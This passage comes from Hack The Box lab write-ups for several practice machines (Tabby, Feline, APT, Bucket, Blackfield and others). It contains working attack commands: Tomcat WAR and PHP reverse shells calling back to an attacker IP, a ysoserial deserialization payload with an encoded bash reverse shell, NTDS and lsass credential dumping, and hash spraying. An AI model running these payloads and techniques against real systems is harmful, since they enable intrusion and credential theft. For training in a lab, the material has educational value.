html
images
status
text
```

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.x.x LPORT=443 -f war > tabby1.war
curl -u 'tomcat:$3cureP4s5w0rd123!' -X PUT -F "file=@tabby1.war" http://10.10.10.194:8080/manager/text/deploy?path=/tabby1

rlwrap nc -lvnp 8443
curl http://10.10.10.194:8080/tabby1
# getshell
```



#### 4. Machine Feline(10.10.10.205)

There is an Apache Tomcat instance on port 8080 and the version of Apache Tomcat is 9.0.27. According to the Apache Tomcat changelog, version 9.0.35 and below suffer from a RCE vulnerability via session persistence (**CVE-2020-9484**). 

A service page contains a form that allows us to upload a file.The text file can be successfully uploaded, but we don't know the directory in which the files are saved. We also see session storage in the server response. Test file extensions,%00,filename="",content-type...

An error provides us how the application handles file uploads. It's using the Apache Commons library, which contains classes and methods that can be used to create deserialization gadgets. We can generate deserialization payloads using [ysoserial](https://github.com/frohoff/ysoserial). We can also see that application is trying to save files to the directory **/opt/samples/uploads/** . As it's using user provided filenames, it errors out because it cannot save a file with same name as a folder ([Linux ENOTDIR](https://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html)). We don't know the version of the Commons library, but we can try all payloads types from ysoserial.

We don't know the CommonsCollections version that will result in RCE, so let's start with 
CommonsCollections1. The payload below should result in a hit on our web server.  

```shell
python3 -m http.server 80

# Test different CommonsCollections
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 "curl http://10.10.x.x/test" > f.session
```

change the value of JSESSIONID to ../../../../../../../opt/samples/uploads/f  and filename to f.session.CommonsCollections2  is worked.

Lets try to spawn a reverse shell. First, stand up a Netcat listener locally, and then generate a
reverse shell payload.Take the base64 output and input it into the following command.

```shell
echo 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1' | base64

java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections2 "bash -c
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDQgMD4mMQo=}|{base64,-d}|
{bash,-i}" > shell.session
```

Repeat the same process as before, and land a reverse shell as tomcat .  



## Other Services

#### 1. Machine Dyplesher(10.10.10.190)

Assumed that we found a Git repository on the site and port 11211 open .

Using memcache tools we can enumerate the keys that are stored in the Memcache database.
Run the below command to install the Memcache utilities.  

```shell
apt-get install libmemcached-tools
# We can now use memccat to view the key values.
memccat --servers=10.10.10.190 a
# got nothing.
```

With [these](https://github.com/internetwache/GitTools) tools, we can download the repository to our local machine. After gitdumper.sh the repo, we have a user and pass from the repository index.php.

```shell
#!/bin/bash
f='/usr/share/wordlists/rockyou.txt'
while IFS= read -r line
do
	memccat --servers=10.10.10.190 --username user1 --password pass1 $line 2>/dev/null >/dev/null
	if [[ $? -ne 1 ]];then
		echo "[+] Key : $line"
	fi
done < "$f"
```

It found 3 valid keys(username password email). Let's enumerate the values for them.

```shell
memccat --servers=10.10.10.190 --username user1 --password pass1 username password email
john hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

We have now the three usernames, three emails and three password hashes. Save the usernames and hashes to a file.Using John The Ripper or hashcat we can try to crack the hashes then login in.



#### 2. Machine APT(10.10.10.213)

Nmap reveals only HTTP (80) and MSRPC (135) open ports.

RPC or Remote Procedure Call, is an IPC (InterProcess Communication) mechanism which allows remote invocation of functions. This can be done locally on the server or via network clients.
Distributed Component Object Model (DCOM) allows applications to expose objects and RPC interfaces to be invoked via RPC.
A list of available interfaces provided by DCOM can be enumerated using impacket's rpcmap.py .

```shell
rpcmap.py 'ncacn_ip_tcp:10.10.10.213' | grep -A2 'DCOM'

......
Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
......
```

We can obtain three mappings each with a UUID. A UUID is used to uniquely identify an interface globally. A quick search with any of the UUIDs will point us to the official documentation which provides a table containing interfaces, their UUIDs and a description of their use.
The three UUIDs obtained match IID_IRemoteSCMActivator , IID_IActivation and
IID_IObjectExporter respectively. Clicking on the links under the Section column will list the methods exposed by these interfaces.
The IID_IObjectExporter seems to provide an interesting set of [methods](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/8ed0ae33-56a1-44b7-979f-5972f0e9416c).  

The Opnum values represent the methods of the interfaces. It is possible to use rpcmap.py to find
out which of the methods allow anonymous access.  

```shell
rpcmap.py 'ncacn_ip_tcp:10.10.10.213' -brute-opnums -auth-level 1 -opnum-max 5
```

The -brute-opnums argument can be used in order to bruteforce the accessible methods. The authentication level will be set to 1 i.e. RPC_C_AUTHN_LEVEL_NONE, meaning no authentication.

The -opnum-max flag will be set to 5 as we only need to test five (5) values. 

Opnum three 3 and 5 return success. It is possible to **access Opnum three 3 and 5 methods i.e. ServerAlive and ServerAlive2 without any authentication**. According to the documentation, this method ServerAlive2 provides network information bindings to the client for further connectivity.

Use impacket to create a script and call this method.  

```python
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
from impacket.dcerpc.v5.dcomrt import IObjectExporter

target = 'ncacn_ip_tcp:10.10.10.213'
rpcTransport = transport.DCERPCTransportFactory(target)

portmap = rpcTransport.get_dce_rpc()
portmap.set_auth_level(RPC_C_AUTHN_LEVEL_NONE)
portmap.connect()

obj = IObjectExporter(portmap)
bindings = obj.ServerAlive2()
for binding in bindings:
    addr = binding['aNetworkAddr']
    print(f"Address: {addr}")
```

Executing the script is going to return the NIC addresses .

```shell
python serveralive.py

Address: apt
Address: 10.10.10.213
Address: dead:beef::b885:d62a:d679:573f
```

We managed to get the IPv6 address of the box. Let's now scan this IP and look for any firewall exempt ports. First we are going to add the IP-hostname mapping to the hosts file. 

```
echo 'dead:beef::b885:d62a:d679:573f apt' | tee -a /etc/hosts  
```

And then run a port scan with nmap.  

```
nmap -T4 --min-rate=1000 -sC -sV -6 apt
```

This time is possible to discover many more services and actually the box appears to serve as a  domain controller of HTB.LOCAL domain. Nmap reveals 53,80,88,135,389,445,5985 open.

We are going to enumerate SMB for any open shares through anonymous authentication.

```
smbclient -N -L //apt  
```

A share named backup is discovered, which contains a file named backup.zip.

The archive appears to be encrypted, which means we'll need to crack the password. By using **zip2john** we can extract the hash and then try to crack it using the rockyou.txt wordlist.  

```shell
zip2john backup.zip > hash
john hash -w=/usr/share/wordlists/rockyou.txt --fork=4
# or
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
```

The cracking is successful. Extracting the contents provides us with the NTDS database as well as with the SECURITY and SYSTEM registry hives. This can be used to obtain NTLM hashes for all users existing during this snapshot.
We can use impacket's secretsdump to extract the hashes.  

```shell
secretsdump.py local -system registry/SYSTEM -security registry/SECURITY -ntds
Active\ Directory/ntds.dit -outputfile hashes
```

The above lists out plenty of hashes, which are stored into the hashes.ntds file. We now can use a tool such as kerbrute to *bruteforce usernames over kerberos* and spot the valid ones of 2000 users.

```shell
cut -d ':' -f 1 /tmp/hashes.txt.ntds > usernames.txt
./kerbrute_linux_amd64 userenum -d htb.local --dc apt usernames.txt
# or
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -dc-ip apt -u usernames.txt -no-pass | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
```

We also find one non-default username i.e. **henry.vinson** . We need to authenticate with this user using CrackMapExec tool. First though we forward port 445 from the IPv6 address to localhost as *CME is not currently support IPv6*.  

```shell
ssh -L '445:[dead:beef::b885:d62a:d679:573f]:445' root@localhost -N
grep 'henry.vinson' hashes.ntds
cme smb localhost -d htb.local -u henry.vinson -H 2de80758521541d19cabba480b260e8f
```

Unfortunately the login fails, which means that the hash is incorrect. We are going to extract all hashes and see if we get lucky with another user's hash. 

```shell
cut -d ':' -f 4 hashes.txt.ntds > hashes.txt
cme smb localhost -d htb.local -u henry.vinson -H hashes.txt
```

There's some rate limit in place to prevent **SMB bruteforce** attacks. We are going to change our method and try to *bruteforce the hashes over Kerberos*.
Kerbrute doesn't support bruteforcing hashes, but we can use pyKerbrute. The script can check a single hash only. Let's modify it to test hashes from a list. Clone the repo and replace the main method in ADPwdSpray.py with the following:  

```python
if __name__ == '__main__':
    kdc_a = 'APT'
    user_realm = 'HTB.LOCAL'
    username = 'henry.vinson'
    hashes = open('hashes.txt', 'r').readlines()
    for line in hashes:
        user_key = (RC4_HMAC, line.strip('\r\n').decode('hex'))
        passwordspray_tcp(user_realm, username, user_key, kdc_a,
line.strip('\r\n'))
```

We also need to replace AF_INET with AF_INET6 while connecting to the socket, as we're using IPv6.

```python
sed -i "s/AF_INET/AF_INET6/g" ADPwdSpray.py
```

This time by executing the script there is no block as there's no restriction on **Kerberos bruteforcing**.  

It returns a result .

This user doesn't seem to have access to any special shares or files so we are going to try login via
WinRM.

```shell
evil-winrm -u henry.vinson -i apt -H e53d87d42adaa3ca32bdb34a876cbffb
```

However, the login is not successful and we fail to establish a session. **SMB fails and WinRM fails.**

Another resource worth enumerating though is the registry. It is possible to **access registry remotely** with the valid credentials we have obtained.When a user logs in, their registry hive is mounted to HKCU , which is unique to each user.However, user hives can also be accessed via the HKEY_USERS (HKU) hive. This stores registry entries for all users on the system. Impacket's reg.py can be used to enumerate the registry .

```shell
reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU
reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\Software
```

The query is successful and we're able to list the subkeys in HKU. One interesting place to look for sensitive information is also the Software subkey. It's used to store configuration and settings for various pplications and might contain credentials.

We notice an interesting key named GiganticHostingManagementSystem and we should check it's contents.

```
reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\Software\\GiganticHostingManagementSystem
```

We obtain the credentials for the user henry.vinson_adm and logged in successfuly using evil-winrm.

```shell
evil-winrm -u henry.vinson_adm -i apt -p 'G1#Ny5@2dvht'
```



#### 3. Machine Bucket(10.10.10.212)

```shell
curl http://s3.bucket.htb -s -D - -o /dev/null

HTTP/1.1 404 
Server: hypercorn-h11
content-type: text/html; charset=utf-8
content-length: 21
access-control-allow-origin: *
access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
access-control-expose-headers: x-amz-version-id
```

We see that this header is related to AWS Simple Storage Service (S3). Its an object storage offering service which is specifically used for storing static files for a website or to have other documents.
The URL format for S3 services in general is as below:

- `https://[bucketname].s3.domainname.com`

- `https://s3-\[region\].domainname.com/[bucketname]`

From this knowledge, we now aware that adserver folder path is a bucket name. We can use
aws command line tool to enumerate the files and folders inside a S3 bucket. We are going to
install the tool by issuing the following command.  

By default AWS cli tool(apt-get install awscli) interacts with s3.amazonaws.com . Since we have another domain hosting it, we can use --endpoint-url option to point the tool to another domain.  

```shell
aws --endpoint-url=http://s3.bucket.htb s3 ls
# Unable to locate credentials. You can configure credentials by running "aws configure".
```

AWS cli tool looks for ~/.aws/credentials file to locate the keys in order to authenticate to the cloud services.  

Configure the keys first(use any random credentials) and list the contents inside S3 bucket.  

```shell
aws --endpoint-url=http://s3.bucket.htb s3 ls
# 2021-04-23 06:36:03 adserver
aws --endpoint-url=http://s3.bucket.htb s3 ls s3://adserver
#                            PRE images/
# 2021-04-23 06:38:04       5344 index.html
```

It is possible to download the files by issuing the fellow command. 

```shell
aws --endpoint-url=http://s3.bucket.htb s3 sync s3://adserver .
```

By looking at the contents of index.html file we find out that these files are served by the Apache server. We can upload a reverse cmd PHP file to the S3 bucket.  

```shell
echo "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.x.x/4444 0>&1 \"');?>" > shell.php
aws --endpoint-url=http://s3.bucket.htb s3 cp shell.php s3://adserver/
```

Standup a listener on port 4444 and browse to `http://bucket.htb/shell.php`  to getshell.  



## Active Directory

#### 1. Machine Blackfield(10.10.10.192)

Official Writeup:

Attempting anonymous and guest enumeration of SMB shares reveals a non-default share named **profiles$** . There is also another non-default share called forensic that we don't have access to.  

```shell
smbmap -u guest -H 10.10.10.192
...
smbclient -L //10.10.10.192/
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share
```

Inspecting the **profiles$** share reveals a list of user profile or document folders. A list of all usernames can be generated using this , and saved to users.txt.

```shell
smbclient -N \\\\10.10.10.192\\profiles$ -c ls | awk '{ print $1 }'
```

With a user list and the Kerberos port open, we can try to spray the users Impacket's **GetNpUsers.py** in order to see if any user has Kerberos pre-authentication disabled.

```shell
GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192 | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
# $krb5asrep$23$support@BLACKFIELD.LOCAL:29d06c...
john hash --format=krb5asrep
# #00^BlackKnight
```

With a domain account,we can proceed to enumerate Active Directory using bloodhound-python. If we run bloodhoundpython with the -ns parameter there will be no need to change the DNS setting on our vm. First,we install bloodhound ingestor using apt (which also installs the neo4j database server), then the data collector with pip3. We can then execute the collector against the target by issuing the bloodhound-python command below.

```shell
apt install bloodhound
pip3 install bloodhound
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns
10.10.10.192 -c DcOnly
```

When running neo4j for the first time we must create the log directory and file, and then proceed go login to http://localhost:7474/ with the credentials neo4j / neo4j , and then set a new password.  

```shell
mkdir -p /usr/share/neo4j/logs
touch /usr/share/neo4j/logs/neo4j.log
neo4j start
```

Then we can start BloodHound with bloodhound and login with the username neo4j and our new password. When signed into the BloodHound GUI, we can drag and drop the bloodhoundpython output in order to import the data.
Start the BloodHound analysis by searching for the support user, right-clicking it and marking it as owned. Let's examine if this account has any further object control that we can leverage. If we search for first degree object control we get a hit.  

Our support user has the password change permission(**ForceChangePassword**) on the audit2020 user. 

To abuse this, we can use rpcclient to set the password.  

```shell
rpcclient -U blackfield/support 10.10.10.192
rpcclient $> setuserinfo audit2020 23 H@CKTHEB0X#
```

After enumerating the SMB shares using CrackMapExec as audit2020 , it's seen that we now have access to the forensic share .

```shell
apt install -y crackmapexec
cme smb 10.10.10.192 -u audit2020 -p 'H@CKTHEB0X#' --shares
```

We connect to the forensic share and see a zipped lsass memory dump. LSASS is short for Local Security Authority Subsystem Service, and it stores credentials in memory on behalf of a user that has an active (or recently active) session. This allows the user to access network resources without re-typing their credentials for each service. LSASS may store credentials in multiple forms, including reversibly encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI keys,and Smartcard PIN. 

Credentials are stored in LSASS for sessions that have been established since the last reboot and have not been closed. For example, credentials are created in memory when a user does any of the following (this is not an exhaustive list).

- Logs on to a local session or RDP session on the computer.

- Runs a process using RunAs.

- Runs an active Windows service on the computer.

- Creates a scheduled task or batch job.

- Runs PsExec with explicit creds, such as PsExec \\server -u user -p pwd cmd .

- Uses WinRM with CredSSP.

So we download the lsass process memory dump locally for further inspection.  

```shell
smbclient.py audit2020:'H@CKTHEB0X#'@10.10.10.192
use forensic
cd memory_analysis
ls
get lsass.zip
exit
```

After unzipping lsass.zip we can use Pypykatz on the extracted lsass.DMP file to retrieve NT hashes.

```shell
pip3 install pypykatz
pypykatz lsa minidump lsass.DMP  
```

Before spraying these credentials against the server, let's check the account lockout policy.

```shell
ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -p 389 -h 10.10.10.192 -b "dc=blackfield,dc=local" -s sub "*" | grep lockoutThreshold
# lockoutThreshold: 0
```

The password policy has a lockoutThreshold of 0, which means we can attempt an unlimited number of passwords without locking the account out (although this is quite noisy). We can extract all usernames and hashes from the lsass dump and save them as hashes and users respectively, and spray with CrackMapExec in order to discover a combination.  

```shell
pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes
pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users
cme smb 10.10.10.192 -u users -H hashes
```

This was successful, and we found a working combination: svc_backup:9658d1d1dcd9250115e2205d9f48400d .
WinRM is enabled and we can gain a PowerShell session using Evil-WinRM.

```shell
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

Now We have a shell.

Also, we can use another way **without bloodhound**(from [this](https://bond-o.medium.com/htb-blackfield-7bb57fe137c6)):    

```shell
runas /netonly /user:blackfield\support powershell.exe # Invoke-UserImpersonation
Import-Module PowerView.ps1
Invoke-ACLScanner -ResolveGUIDs -DomainController 10.10.10.192 -SamAccountName audit2020
```

I made little changes and simulated on my VM, it should work:

```powershell
# Set up Windows VM routing through Kali and join it to the domain,and login in with user support. From: https://snowscan.io/htb-writeup-multimaster/
Import-Module PowerView.ps1

$UserSID = Get-DomainUser support | Select-Object -ExpandProperty objectsid

Invoke-ACLScanner -ResolveGUIDs -DomainController 10.10.10.192 | Where-Object {$_.securityidentifier -eq $UserSID}
<#
ObjectDN                : CN=audit2020,CN=Users,DC=blackfield,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : User-Force-Change-Password
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-4194615774-2175524697-3563712290-1104
IdentityReferenceName   : support
IdentityReferenceDomain : blackfield.local
IdentityReferenceDN     : CN=support,CN=Users,DC=blackfield,DC=local
IdentityReferenceClass  : user
#>

# confirm it
Get-DomainObjectACL audit2020 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID }
<#
AceQualifier           : AccessAllowed
ObjectDN               : CN=audit2020,CN=Users,DC=blackfield,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-4194615774-2175524697-3563712290-1103
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-4194615774-2175524697-3563712290-1104
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
#>
```

